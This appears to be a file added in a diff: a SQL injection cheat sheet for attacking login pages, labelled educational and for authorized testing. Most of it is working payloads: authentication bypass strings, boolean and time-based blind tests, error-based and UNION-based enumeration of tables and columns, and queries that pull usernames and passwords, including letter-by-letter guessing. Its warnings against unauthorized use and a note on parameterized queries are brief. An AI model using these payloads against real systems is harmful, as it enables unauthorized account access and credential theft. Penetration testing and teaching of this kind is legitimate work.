@@ -1,0 +1,239 @@
+# SQL Injection Payloads for Login Page Testing
+# For EDUCATIONAL USE ONLY
+
+========================================
+1. Basic Authentication Bypass
+========================================
+
+Username: ' OR '1'='1
+Password: anything
+
+# Potential Output:
+# --> Login successful! (You are logged in as the first user in the table)
+# --> Welcome, admin! (If admin is the first user)
+# --> You are redirected to the dashboard/homepage.
+
+# Error Message Behaviour:
+# --> If vulnerable, no error is shown and access is granted.
+# --> If patched, login fails as normal.
+
+-- OR --
+
+Username: admin' --
+Password: anything
+
+# Potential Output:
+# --> Login successful! (Logged in as admin without correct password)
+# --> Welcome, admin!
+# --> Redirected to admin panel or dashboard.
+
+# Error Message Behaviour:
+# --> No error, logged in if vulnerable.
+# --> Login fails if patched.
+
+========================================
+2. Comment Out Rest of Query
+========================================
+
+Username: ' OR 1=1 --
+Password: anything
+
+# Potential Output:
+# --> Login successful!
+# --> No password check enforced, access granted.
+
+# Error Message Behaviour:
+# --> Login bypass, no error.
+# --> Fails if protected.
+
+-- OR --
+
+Username: admin' --
+Password: anything
+
+# Potential Output:
+# --> Logged in as admin (even with wrong password).
+
+# Error Message Behaviour:
+# --> No error, logged in if vulnerable.
+
+========================================
+3. Blind Injection Test (to check response difference)
+========================================
+
+Username: ' AND 1=1 --
+Password: anything
+
+# Potential Output:
+# --> Login fails (if credentials are wrong, this acts as a normal login).
+
+# Error Message Behaviour:
+# --> Behaves like normal login failure.
+
+Username: ' AND 1=2 --
+Password: anything
+
+# Potential Output:
+# --> Login always fails (proves injection is working if error messages change).
+
+# Error Message Behaviour:
+# --> Behaves like normal login failure unless app leaks DB errors.
+
+========================================
+4. Try SQL Syntax Errors (to reveal DB errors)
+========================================
+
+Username: '
+Password: 
+
+Username: "
+Password: 
+
+# Potential Output:
+# --> Database error displayed (e.g., "Syntax error in SQL statement", "Unclosed quotation mark", etc.)
+# --> Detailed error message revealing SQL structure.
+
+# Error Message Behaviour:
+# --> If vulnerable, error message like:
+#       - "You have an error in your SQL syntax"
+#       - "Unclosed quotation mark after the character string"
+#       - "SQLSTATE[42000]: Syntax error or access violation"
+# --> If properly handled, generic error like:
+#       - "Invalid username or password"
+#       - No details about the error.
+
+========================================
+5. Typical Queries (for reference, do not paste)
+========================================
+
+SELECT * FROM users WHERE username = '[input]' AND password = '[input]';
+
+# If vulnerable, above inputs should bypass authentication
+
+========================================
+# Tips:
+# - Always observe error messages and behavior.
+# - NEVER use these on systems you do not own or have permission to test.
+# - If the app uses parameterized queries, these will NOT work (which is good security!).
+# - Detailed SQL error messages are a big hint that the application is vulnerable.
+# - Generic messages (like "Login failed") usually mean better security, but not always.
+========================================
+
+========================================
+6. Extracting Table Names (Database Enumeration)
+========================================
+
+# 6.1 Using UNION-based Injection (If errors/messages are shown and output is visible)
+
+Username: ' UNION SELECT NULL, table_name FROM information_schema.tables -- 
+Password: 
+
+# Potential Output:
+# --> If the number of columns matches, you may see a list of table names on the page.
+
+# Error Message Behaviour:
+# --> "Unknown column" or "The used SELECT statements have a different number of columns" means you need to adjust the number of NULLs to match columns in the original query.
+
+# Tip: Try different numbers of NULLs, e.g.
+# ' UNION SELECT NULL, NULL, table_name FROM information_schema.tables --
+# Replace '2' or '3' NULLs with however many columns the original query has.
+
+----------------------------------------
+6.2 Error-based Extraction (If the error message displays database info)
+
+Username: ' and (select 1 from (select count(*),concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))x from information_schema.tables group by x)a) -- 
+Password: 
+
+# Potential Output:
+# --> The error message will contain the first table name.
+
+----------------------------------------
+6.3 Blind Enumeration (No visible errors or output, only yes/no responses)
+
+# Find out if table exists by checking for delays (using time-based blind SQLi):
+
+Username: ' AND (SELECT 1 FROM information_schema.tables WHERE table_name='users') AND SLEEP(5) -- 
+Password: 
+
+# Potential Output:
+# --> If login is delayed by 5 seconds, the 'users' table exists.
+
+========================================
+7. Extracting Column Names (For a Known Table)
+========================================
+
+# 7.1 UNION-based (adjust column count as needed):
+
+Username: ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- 
+Password: 
+
+# Potential Output:
+# --> See list of column names for the 'users' table.
+
+# Try variations if column count is unknown.
+
+----------------------------------------
+7.2 Error-based or Blind
+
+# Similar to above, but adapt your payload to leak column names through errors or delays.
+
+========================================
+8. Extracting Actual Data (e.g., Usernames/Passwords)
+========================================
+
+# 8.1 UNION-based (replace columns as needed):
+
+Username: ' UNION SELECT NULL, username FROM users -- 
+Password: 
+
+# Or to get both username and password (if 3 columns):
+
+Username: ' UNION SELECT NULL, username, password FROM users -- 
+Password: 
+
+# Potential Output:
+# --> Page may display usernames and/or passwords.
+
+----------------------------------------
+8.2 Error-based or Blind
+
+# Use error or time-based tricks to extract data one letter at a time, e.g.,
+Username: ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- 
+Password: 
+
+# If login works only when you guess the correct letter, you can enumerate the password letter by letter.
+
+========================================
+9. Finding the Number of Columns (for UNION injection)
+========================================
+
+Username: ' ORDER BY 1 -- 
+Username: ' ORDER BY 2 -- 
+Username: ' ORDER BY 3 -- 
+# etc.
+
+# Potential Output:
+# --> No error until you exceed the actual number of columns.
+
+# Or try:
+Username: ' UNION SELECT NULL -- 
+Username: ' UNION SELECT NULL, NULL -- 
+Username: ' UNION SELECT NULL, NULL, NULL -- 
+# etc.
+
+# When the query works, you have found the correct column count for UNION injection.
+
+========================================
+10. Tips for Extraction
+========================================
+
+- Always start by finding the number of columns with 'ORDER BY' or trial-and-error with UNION.
+- Replace NULLs with fields you want to extract.
+- Use information_schema for MySQL; use pg_catalog for PostgreSQL; use sys.tables/sys.columns for SQL Server.
+- If output is not shown on the page, look for error messages or use time-based attacks for blind injection.
+- Always stay within your legal/ethical boundaries!
+
+========================================
+# NEVER use these on systems you do not own or do not have explicit permission to test!
+# Educational/authorized penetration testing ONLY.
+========================================
